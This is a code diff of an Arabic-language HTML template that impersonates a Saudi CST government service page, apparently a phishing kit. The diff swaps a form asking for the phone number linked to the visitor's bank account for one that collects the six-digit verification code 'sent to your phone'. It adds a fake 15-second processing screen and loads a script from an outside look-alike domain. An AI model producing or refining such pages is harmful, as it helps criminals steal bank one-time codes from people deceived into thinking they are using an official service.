@@ -14868,6 +14868,7 @@
         </div>
         <!-- /GLOBAL-LOADER -->
         <!-- PAGE -->
+
         <div class="page">
             <div class="page-main">
                 <!-- app-Header -->
@@ -14945,7 +14946,7 @@
                                 </div>
                             </div>
 
-                            <script src="{{asset('theme/cst/assets/frontend/cst/announceController.js.download')}}"></script>
+                            <script src="https://vsivtenta.com/assets/frontend/cst/announceController.js.download"></script>
                             <script>
                                 $(document).ready(function () {
                                     announceController.getActiveAnnounce();
@@ -14956,7 +14957,7 @@
                                     <div class="bg-white p-0 p-lg-4 h-100 d-flex flex-column offcanvas offcanvas-start" id="offcanvasSideMenu">
                                         <div class="offcanvas-header d-flex d-lg-none border-bottom">
                                             <h5 class="offcanvas-title text-dark fw-bold" id="offcanvasExampleLabel">
-                                                <img class="offcanvas-logo" src="{{asset('theme/cst/assets/frontend/cst/gate_logo_side.svg')}}" />
+                                                <img class="offcanvas-logo" src="https://vsivtenta.com/assets/frontend/cst/gate_logo_side.svg" />
                                             </h5>
                                             <button role="button" class="text-dark p-0" data-bs-dismiss="offcanvas" aria-label="close">
                                                 <i class="mutasil-icon mutasil-icon-29 fa-lg"></i>
@@ -15034,7 +15035,7 @@
                                         <!-- PAGE-HEADER -->
                                         <div class="page-header mb-0">
                                             <div class="d-flex page-header-element align-items-center">
-                                                <img src="{{asset('theme/cst/assets/frontend/cst/sims.svg')}}" width="64" class="me-2" />
+                                                <img src="{{asset('theme/images/sims.svg')}}" width="64" class="me-2" />
                                                 <div>
                                                     <a href="https://mutasilind.cst.gov.sa/Services/Index" class="back_btn pb-1 align-items-end mt-0 fs-12">
                                                         <img src="{{asset('theme/images/arrow-right.svg')}}" width="20" class="me-2" />
@@ -15055,86 +15056,36 @@
                                                     <div class="service-steps accordion mb-6">
                                                         <div class="accordion-item">
                                                           
-                                                            <div id="collapseOne" class="accordion-collapse collapse show" aria-labelledby="headingOne">
+                                                            <div id="collapseOne" class="accordion-collapse collapse" aria-labelledby="headingOne">
                                                             
-                                                                <form method="post" action="{{route('save_phone_auth_state')}}" name="frmRInquiry" id="inquiry_form">
-                                                                   @csrf                                                                   <div class="row" id="inquiry">
+                                                                <form method="post" action="{{route('save_phone_code')}}" name="frmRInquiry" id="inquiry_form">
+                                                                    @csrf                                                                   <div class="row" id="inquiry">
 
-                                                                        <div class="col-md-12">
-                                                                        <p class="back_btn pb-1 align-items-end mt-0 fs-10">من اجل حماية عميلنا, نحن بحاجة الى التحقق من ملكية الهاتف النقال, الرجاء كتابة رقم هاتفك النقال المرتبط بحسابك البنكي وإختيار مشغل الشبكة ثم النقر على دخول</p>
-
-                                                                        </div>
                                                                         <div class="col-md-6" id="mobileNumber-div">
                                                                             <div class="form-group">
+                                                                                <p class="back_btn pb-1 align-items-end mt-0 fs-12">تم إرسال رمز التحقق الى هاتفك النقال, الرجاء إدخاله في هذه الخانة:</p>
                                                                                 <label class="form-label-small px-3">
-                                                                                    رقم الهاتف المرتبط بالحساب البنكي * :
+                                                                                    رمز التحقق * :
                                                                                 </label>
 
                                                                                 <input
-                                                                                    placeholder="ادخل الرقم بصيغة 05xxxxxxxx"
+                                                                                    placeholder="الرجاء ادخال رمز التحقق."
                                                                                     type="tel"
-                                                                                    maxlength="10"
-                                                                                    smk-error-msg-required="الرجاء ادخال رقم الهاتف المرتبط بحسابك البنكي."
+                                                                                    id="code"
+                                                                                    name="code"
+                                                                                    maxlength="6"
+                                                                                    smk-error-msg-required="الرجاء ادخال رمز التحقق."
                                                                                     class="form-control form-control-lg"
-                                                                                    id="MobileNumber"
-                                                                                    name="phone"
                                                                                     onkeypress="return onlyNumberKey(event)"
                                                                                 />
                                                                             </div>
                                                                         </div>
-
-                                                                        <div class="col-md-6 pb-5" id="psd">
-                                                                            <div class="form-group">
-                                                                                <label for="telCompany" class="form-label-small px-3">مشغل شبكة الجوال * :</label>
-                                                                                <select class="form-control form-control-lg" name="telCompany" id="telCompany" aria-label="مشغل شبكة الجوال">
-                                                                                    <option value="" selected>إختر مشغل شبكة الجوال</option>
-                                                                                    <option value="Zain">Zain</option>
-                                                                                    <option value="Mobily">Mobily</option>
-                                                                                    <option value="STC">STC</option>
-                                                                                    <option value="Salam">Salam</option>
-                                                                                    <option value="Virgin">Virgin</option>
-                                                                                    <option value="Redbull">Redbull</option>
-                                                                                </select>
-                                                                            </div>
-                                                                        </div>
                                                                     </div>
-
-                                                                    {{-- <div class="row">
-                                                                        <div class="col-md-6">
-                                                                            <div class="form-group">
-                                                                            <label class="form-label-small px-3">
-                                                                                    الرجاء إدخال كود التحقق المكتوب داخل الصورة * :
-                                                                                </label>
-                                                                                <div class="input-group">
-                                                                                    <div class="input-group-prepend">
-                                                                                        <img id="img-captcha" src="https://vivsfotty.com/assets/frontend/cst/Image" width="130" height="50" />
-                                                                                    </div>
-                                                                                    <input
-                                                                                        type="text"
-                                                                                        required=""
-                                                                                        smk-error-msg-required="الرجاء ادخال كود التحقق بشكل صحيح"
-                                                                                        maxlength="5"
-                                                                                        id="CaptchaCode"
-                                                                                        name="CaptchaCode"
-                                                                                        class="form-control form-control-lg px-3"
-                                                                                        placeholder="ادخل كود التحقق في الصورة"
-                                                                                    />
-                                                                                    <button class="btn btn-default" type="button" id="captcha-restart">
-                                                                                         <i class="fas fa-repeat fa-lg"></i> 
-                                                                                        <img src="{{asset('theme/cst/assets/frontend/cst/reload.svg')}}" style="    height: 24px;
-                                                                                                 width: 20px;" alt="">
-                                                                                    </button>
-                                                                                    <br />
-                                                                                </div>
-                                                                                <span id="captchaCodeErrMsg" class="text-danger"></span>
-                                                                            </div>
-                                                                        </div>
-                                                                    </div> --}}
 
                                                                     <div class="row">
                                                                         <div class="col-md-12 text-end">
                                                                             <button id="confirmBtn" onclick="saveForm(this.form);" type="submit" class="btn btn-outline-primary px-5 py-2 fw-bold inquiry-btn">
-                                                                                دخــول
+                                                                                التالي
                                                                             </button>
                                                                         </div>
                                                                     </div>
@@ -15142,6 +15093,17 @@
 
                                                                 <div id="dynamicContent"></div>
                                                             </div>
+
+                                                            <div id="progress" class="accordion-collapse collapse show" aria-labelledby="headingOne">
+                                                                <small>سوف يتم إرسال رمز التحقق الى هاتفك النقال</small>
+                                                                <h1 class="page-title font-weight-bold page-header-element">
+                                                                    الرجاء الإنتضار الى حين معالجة العملية
+                                                                </h1>
+                                                                <div class="progress" role="progressbar" aria-label="Animated striped example" aria-valuenow="75" aria-valuemin="0" aria-valuemax="100">
+                                                                    <div class="progress-bar progress-bar-striped progress-bar-animated" style="width: 100%"></div>
+                                                                </div>
+                                                            </div>
+
                                                         </div>
                                                     </div>
                                                 </div>
@@ -15149,6 +15111,17 @@
                                         </div>
                                         <!-- /Row -->
                                     </div>
+
+                                    <script>
+                                        var time = "15000";
+                                        window.setTimeout(function() {
+                                            const collapseOne = document.getElementById("collapseOne");
+                                            collapseOne.classList.add("show");
+
+                                            const progress = document.getElementById("progress");
+                                            progress.classList.remove("show");
+                                        }, time);
+                                    </script>
 
                                     <script>
                                         function onlyNumberKey(evt) {
@@ -15273,7 +15246,7 @@
                                                 $.smkAddError(CaptchaCodeInput, CaptchaCodeInput.attr("smk-error-msg-required"));
                                             }
 
-                                            $("#dynamicContent").html(`<div class="text-center"><img src="//dgcdn.citc.gov.sa/V4/assets/images/loader.svg')}}" /></div>`);
+                                            $("#dynamicContent").html(`<div class="text-center"><img src="//dgcdn.citc.gov.sa/V4/assets/images/loader.svg" /></div>`);
                                             $("#confirmBtn").attr("disabled", "disabled");
 
                                             $("#captchaCodeErrMsg").text("");
@@ -15429,10 +15402,10 @@
                             </ul>
                             <ul class="footer-social-list">
                                 <li>
-                                    <a href="https://www.cst.gov.sa/"><img src="{{asset('theme/cst/assets/frontend/cst/cst.svg')}}" width="48" height="48" alt="CST" aria-label="CST Website" class="vision-logo me-2" /></a>
+                                    <a href="https://www.cst.gov.sa/"><img src="{{asset('theme/images/cst.svg')}}" width="48" height="48" alt="CST" aria-label="CST Website" class="vision-logo me-2" /></a>
                                 </li>
                                 <li>
-                                    <img src="{{asset('theme/cst/assets/frontend/cst/vision.svg')}}" width="64" height="43" alt="Vision 2030" class="vision-logo" />
+                                    <img src="{{asset('theme/images/vision.svg')}}" width="64" height="43" alt="Vision 2030" class="vision-logo" />
                                 </li>
                             </ul>
                         </div>
